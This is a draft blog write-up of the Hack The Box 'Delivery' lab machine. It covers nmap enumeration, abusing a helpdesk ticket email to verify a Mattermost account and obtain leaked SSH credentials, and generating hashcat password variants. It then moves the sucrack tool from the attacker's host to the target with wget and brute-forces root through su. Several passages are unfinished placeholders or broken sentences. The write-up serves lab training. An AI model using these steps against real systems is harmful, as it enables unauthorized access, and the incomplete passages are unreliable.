---
layout: post
title:  "Hack The Box - Delivery - Writeup"
date:   2000-01-01 07:00:00 +0200
tags: ["Hack The Box","OSCP"]
---
{% assign imgDir="HTB-Delivery-Writeup" %}

# Introduction
The hack the box machine "Delivery" is an easy machine which is included in [TJnull's OSCP Preparation List](https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=1839402159). Exploiting this machine requires knowledge in the areas of password cracking.

<img style="Width:550px;" src="/assets/{{ imgDir }}/card.png" alt="HTBCard">

By enumerating the target, it is possible to discover two web applicatoin. These are vulnerable to the [ticket trick]() vulnerability.

# Exploitation
We start by performing an nmap scan by executing `nmap -sS -sC -sV -p- 10.10.10.222`. The `-sS` `-sC` and `-sV` flags instructs nmap to perform a SYN scan to identify open ports followed by a script and version scan on the ports which were identified as open. The `-p-` flag instructs nmap to scan all the ports on the target. From the scan results, shown below, we can see that port 22, 80 and 8065 where identified as open. The first port is SSH while the other two are two web applications communicating over HTTP.

![nmap](/assets/{{ imgDir }}/nmap.png)

We start by investigating the web application on port 80 and 8065 by navigating to the URLs [http://10.10.10.222](http://10.10.10.222) and [http://10.10.10.222:8065](http://10.10.10.222:8065) in a browser. This results in the two landing pages shown below. For the web application on port 80, the most interesting things are the "Helpdesk" link (underlined in the image) and the "Contact Us" button. For the other web application, we can see that we are allowed to create user accounts.

![port80](/assets/{{ imgDir }}/port80.png)

![port8065](/assets/{{ imgDir }}/port8065.png)

If we click the "Helpdesk" link, we are informed by the browser that the website can not be found. This is because the link points to "http://helpdesk.delivery.htb" and the domain "helpdesk.delivery.htb" can't be resolved to an IP address. For us to reach this URL, we need to send a request to `10.10.10.222` where the "Host" header of the request has the value "helpdesk.delivery.htb". An easy way to ensure this is to map the domain "helpdesk.delivery.htb" to the IP address "10.10.10.222". As such, when we try to navigate to "Helpdesk.delivery.htb", the browser will send the request to 10.10.10.222 and ask for the host "helpdesk.delivery.htb" by placing it in header named "Host". To map the domain to the ip address, we can simply add a line to the `/etc/hosts` file, as demonstrated below. Note that the `-n` flag of the `echo` command is used to avoid trailing newlines. The `\t` and `\n` characters represent a tab and a newline character respectively. The tee command is simply used to write the output of `echo -n '10.10.10.222\thelpdesk.delivery.htb'` to the `/etc/hosts` file.

we also add "delivery.htb" since this appears to be the main domain name of the target.

{% highlight none linenos %}
┌──(kali㉿kali)-[/tmp/x]
└─$ echo -n '10.10.10.222\tdelivery.htb\n10.10.10.222\thelpdesk.delivery.htb' | sudo tee -a /etc/hosts
[...]
┌──(kali㉿kali)-[/tmp/x]
└─$ cat /etc/hosts 
[...]
10.10.10.222    delivery.htb
10.10.10.222    helpdesk.delivery.htb

┌──(kali㉿kali)-[/tmp/x]
└─$
{% endhighlight %}

If we retry to navigate to the help desk URL, we see the page below.

![helpdesk](/assets/{{ imgDir }}/helpdesk.png)

This page includes links to create help desk tickets, to check the status of existing help desk tickets and to sign in with an account. If we click the "Open a New Ticket" button, we reach a form. We can fill in this form with random values, as shown below. 

![createTicket](/assets/{{ imgDir }}/createTicket.png)

Next, we click the "Create Ticket" button. This results in the page below which provides us with an id and an email address. This email addressi belongs to the domain "delivery.htb" and anything emailed to it will be added to our support ticket.

![ticketCreated](/assets/{{ imgDir }}/ticketCreated.png)

Many different services assumes that a user with an email at a specific domain works for that domain. For example, [Slack]() assumes that someone. Since we have access to a . This concept is called Ticket Trick and was originally described [in 2017]. 

[Explain ticket trick briefly]

![checkTicketStatus](/assets/{{ imgDir }}/checkTicketStatus.png)

Press the "View Ticket" button.

![checkTicketStatus2](/assets/{{ imgDir }}/checkTicketStatus2.png)

We proceed by creating an account on the mattermost website by clicking the "Sign Up" button we saw earlier. We fill in the resulting form with the email, username and password set to "6062591@delivery.htb", "testUser" and "Testing123!" respectively, as shown below.

![mattermostSignUp](/assets/{{ imgDir }}/mattermostSignUp.png)

We press "Create Account" and reach a page telling us that a verification email has been sent.

![mattermostEmail](/assets/{{ imgDir }}/mattermostEmail.png)

If we go back to the ticket information page and refresh it, we can see that the ticket has been update with the content of the verification email! This means that we have the verification link for our account.

![verifyAccount](/assets/{{ imgDir }}/verifyAccount.png)


![verificationLink](/assets/{{ imgDir }}/verificationLink.png)
http://delivery.htb:8065/do_verify_email?token=7pyy8jp3eumdj1s6xnki8owk1a97puwow5f4s63jg1ai4yts5xpoe9tkgmz4aasi&email=6062591%40delivery.htb

We type in the password "Testing123!" which we set earlier and press "Sign in". This makes us reach a page where we can create a new Team or join an existing one. Since our email is part of the "delivery.htb" domain, we are allowed to join the internal team for "delivery.htb".

![selectTeam](/assets/{{ imgDir }}/selectTeam.png)

We press internal, then skip tutorial

![skipTutorial](/assets/{{ imgDir }}/skipTutorial.png)

![internalChat](/assets/{{ imgDir }}/internalChat.png)

![ssh](/assets/{{ imgDir }}/ssh.png)

We get the credentials maildeliverer:Youve_G0t_Mail! . We also get to know that the root user password is some variant of "PleaseSubscribe!" and that it should be possible to generate the password using hashcats rule engine. We can try to log in with these credentials over SSH. As shown above, this works and we get a shell as the `maildeliverer` user!



# Privilege Escalation

We start by generating passwords based on the string 'PleaseSubscribe!' which we found earlier. This can be done using hashcat `echo PleaseSubscribe! | hashcat -r /usr/share/hashcat/rules/best64.rule --stdout > passwords`. The `-r` flag is used to specify a `.rule` file. A rule file is simply a file which contains "rules" that describe how a string should be modified. In this case, the string is "PleaseSubscribe!". 

We perform a rule-based attack. 

F.e. Leetify:
`so0`
`si1`
`se3`
This substitutes the o,i and e characters for 0,1 and 3 respectively. For example, the word "leetify" would become "l33t1fy". To understand the format of rules, see https://hashcat.net/wiki/doku.php?id=rule_based_attack.

A tool which can crack user passwords, without first requiring their password hashes, is [sucrack](https://github.com/hemp3l/sucrack/). However, the drawback of this tool is that it has to be executed locally on the target host. As the name suggests, the tool uses the `su` command, which is normally used to switch user, to brute force the password of a particular user. Like conventional cracking tools, sucrack can read a wordlist and attempt each password in that wordlist. It attempts to use each password in the wordlist until it either runs out of passwords or finds a password which is correct for the target user.

We can download the sucrack project from its [Github repository](https://github.com/hemp3l/sucrack/), as a zip file, using `wget`. Then, we can transfer the file by starting a python web server by executing `python3 -m http.server` and downloading the zip file using `wget` on the compromised host, as demonstrated in the two code blocks below.

{% highlight none linenos %}
wget https://github.com/hemp3l/sucrack/archive/refs/heads/master.zip -O sucrack.zip
python3 -m http.server 80
{% endhighlight %}

{% highlight none linenos %}
wget10.10.14.4/sucrack.zip
unzip sucrack.zip
{% endhighlight %}

We compile the sucrack as explained in the `README.md` file of the Github repository, as shown below.

{% highlight none linenos %}
cd /dev/shm/sucrack/
./configure
make
{% endhighlight %}
Next, we use the sucrack binary to brute force passwords for the `root` user by executing `/dev/shm/sucrack/src/sucrack -a -w 20 -s 10 -u root -rl AFLafld /dev/shm/wordlist`.

![bf](/assets/{{ imgDir }}/bf.png)

![rootShell](/assets/{{ imgDir }}/rootShell.png)

Once we have the password, we can use the `su` command to get a shell as the `root` user.

TODO: How to know sucrack dir?
TODO: Flags